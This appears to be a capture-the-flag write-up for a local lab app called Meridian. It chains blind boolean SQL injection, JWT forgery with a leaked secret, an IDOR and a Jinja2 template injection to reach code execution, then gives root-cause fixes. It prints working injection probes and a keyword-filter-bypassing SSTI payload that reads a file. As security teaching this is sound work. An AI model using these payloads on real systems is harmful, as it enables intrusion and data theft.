# Meridian — Full Chain: Blind SQLi → JWT Forge → IDOR → Filtered SSTI → RCE

| | |
|---|---|
| **Vulnerabilities** | Blind boolean SQL injection · JWT forgery (secret leaked via SQLi) · IDOR / BOLA · filtered server-side template injection |
| **Impact** | Unauthenticated remote code execution |
| **Difficulty** | ★★★★★ |
| **Approach** | Black-box, no credentials, no source |

## The application

Meridian is a B2B invoicing & analytics SaaS. You begin with **nothing** — no account, no endpoint
map, no source. The flag lives at `/flag.txt`, readable only through RCE, and four linked flaws stand
between a visitor and the shell, each unlocking the next.

```bash
docker compose up -d        # http://localhost:9005
```

## Stage 1 — Blind boolean SQL injection

The only unauthenticated input is a public invoice-status lookup. Manual probing shows it's
injectable, and that a WAF blocks `UNION` while errors are swallowed — so it's **boolean-blind**:

```
ref=INV-1001' OR 1==1 -- -   →  {"found":true, ...}
ref=INV-1001' OR FALSE -- -  →  {"found":false, ...}
```

A clean true/false oracle. From there, extract the schema and dump the two tables that matter —
`users` (the account list) and `config`, which holds the application's **JWT signing secret**:

```
config.jwt_secret = m3r1d14n_204ea05417c699c3
```

## Stage 2 — Forge a JWT

The signing secret should never be reachable by the application's own data — but here it was sitting
in a table the SQLi can read. With it, I forge a valid admin token (no password required):

```json
header:  {"alg":"HS256","typ":"JWT"}
payload: {"wid":1,"role":"admin","email":"ops@meridian.io"}
```

`GET /api/me` with the forged token returns `role: admin` — authenticated as the internal ops user.

## Stage 3 — IDOR / BOLA to leak the render token

The protected report renderer needs a separate `X-Render-Token`. The workspace-settings endpoint is
authenticated but performs **no object-level authorization** — any logged-in user can read any
workspace's settings:

```
GET /api/workspaces/1/settings   →  render_token: rtok_c4703ce58bac  (render_enabled: true)
```

Workspace 1 ("Meridian Ops", internal) is the only one with rendering enabled — and now I have its
token.

## Stage 4 — Filtered SSTI → RCE

The renderer compiles a user-supplied `template` with Jinja2. `{{7*7}}` returns `49` — template
injection confirmed. A keyword blacklist blocks the obvious gadgets (`os`, `popen`, `globals`,
`subprocess`, `flag`, …), but a blacklist is bypassable: splitting the blocked keywords with string
concatenation reassembles them at render time without any forbidden substring ever appearing:

```jinja2
{{ url_for|attr('__glo'+'bals__')|attr('__getitem__')('__buil'+'tins__')|attr('__getitem__')('open')('/fla'+'g.txt')|attr('read')() }}
```

```
FLAG{sql1_jwt_1d0r_f1lt3r3d_sst1_m3r1d14n_ch41n}
```

## Root-cause fixes

Each flaw is fixed at the source, not filtered around. (Breaking any single link stops the RCE — but
each flaw is a real vulnerability on its own, so all four are fixed.)

- **SQLi:** parameterized query — `ref` is bound as a value and can never alter the SQL structure.
  The WAF becomes incidental defense-in-depth, not the control.
  ```python
  db.execute("SELECT id, ref, status FROM invoices WHERE ref = ?", (ref,))
  ```
- **JWT:** the signing secret is the real root. It's removed from the database entirely and loaded
  from the environment / a secret manager, so even a future SQLi can't leak it; the algorithm stays
  pinned to `["HS256"]` to block `none`/confusion downgrades.
- **IDOR:** enforce object-level authorization — a user may read only their own workspace (validate
  the session exists *before* touching its fields; default-deny):
  ```python
  if not u: return jsonify({"error": "unauthenticated"}), 401
  if wid != u["wid"]: return jsonify({"error": "forbidden"}), 403
  ```
- **SSTI:** the blacklist is a bypassable band-aid — remove it and render through a Jinja2
  `SandboxedEnvironment`, which blocks access to unsafe attributes (`__init__`, `__globals__`, …)
  while still rendering legitimate templates:
  ```python
  from jinja2.sandbox import SandboxedEnvironment
  sandbox_env = SandboxedEnvironment()
  out = sandbox_env.from_string("REPORT> " + tmpl).render()
  ```

## Key lesson

Four individually mid-severity flaws chain into unauthenticated RCE. Two recurring principles tie the
fixes together: **never make a security decision from attacker-reachable data** (a signing secret in
a queryable table; a client-supplied workspace id), and **keep untrusted input as data, not code** —
remove the dangerous mechanism (parameterize, sandbox) rather than blacklisting your way around it.
